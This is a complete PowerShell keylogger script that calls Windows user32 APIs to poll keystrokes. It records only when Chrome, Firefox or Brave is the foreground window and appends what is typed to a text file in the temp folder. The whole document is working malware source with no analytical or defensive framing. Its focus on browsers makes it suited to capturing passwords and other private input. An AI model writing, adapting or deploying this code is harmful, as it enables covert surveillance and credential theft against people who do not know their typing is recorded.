function Start-KeyLogger($Path="$env:temp\keylogger.txt", $TargetProcesses=@("chrome.exe","firefox.exe","brave.exe")) 
{
 
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll", SetLastError = true)]
public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
'@

 
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru


  [Console]::TreatControlCAsInput = $true

  try
  {
    Write-Host "Recording key presses for browsers: $($TargetProcesses -join ', '). The script will continue logging until stopped." -ForegroundColor Red

    
    $sessionSeparator = "`r`n[=== New Session ($([DateTime]::Now.ToString()) - Target Browsers: $($TargetProcesses -join ', ') ===]`r`n"
    [System.IO.File]::AppendAllText($Path, $sessionSeparator, [System.Text.Encoding]::Unicode)

 
    while ($true) {
      Start-Sleep -Milliseconds 40

     
      $foregroundWindow = $API::GetForegroundWindow()
      $processId = 0
      $null = $API::GetWindowThreadProcessId($foregroundWindow, [ref]$processId)
      $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
      

      if (-not $process -or ($TargetProcesses -notcontains $process.ProcessName + ".exe")) {
        continue
      }
      

      for ($ascii = 9; $ascii -le 254; $ascii++) {
  
        $state = $API::GetAsyncKeyState($ascii)


        if ($state -eq -32767) {
          $null = [console]::CapsLock

 
          $virtualKey = $API::MapVirtualKey($ascii, 3)


          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

     
          $mychar = New-Object -TypeName System.Text.StringBuilder


          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
         
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
 
    notepad $Path
  }
}


Start-KeyLogger
